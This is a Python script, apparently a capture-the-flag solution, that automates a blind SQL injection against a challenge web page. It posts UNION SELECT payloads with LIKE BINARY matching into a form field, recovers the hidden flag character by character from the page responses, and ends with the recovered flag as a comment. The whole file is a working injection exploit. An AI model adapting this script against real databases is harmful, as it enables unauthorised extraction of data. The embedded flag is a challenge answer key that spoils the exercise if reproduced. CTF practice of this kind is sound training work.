import requests, string

charset = string.printable.replace('%', '').replace('\'', '').replace('_', '')

url = 'http://challenges.unitedctf.ca:18000/challenge3.php'
flag = ''

while not flag[-2:] == '__':
	print('Current flag:', flag)
	letter_found = False
	for c in charset:
		tmpFlag = flag + c
		payload = f"' UNION SELECT id, flag FROM challenge3 WHERE flag LIKE BINARY '{tmpFlag}%'; #"
		data = {'flagID': payload}
		r = requests.post(url, data=data).text

		if r.find(' aucun ') == -1:
			letter_found = True
			flag += c 
			break

	if not letter_found:
		flag += '_'

print(flag[:-2])
# FLAG-In_the_Land_of_Mariadb_where_the_Columns_lie_4Z3H1ymWBX
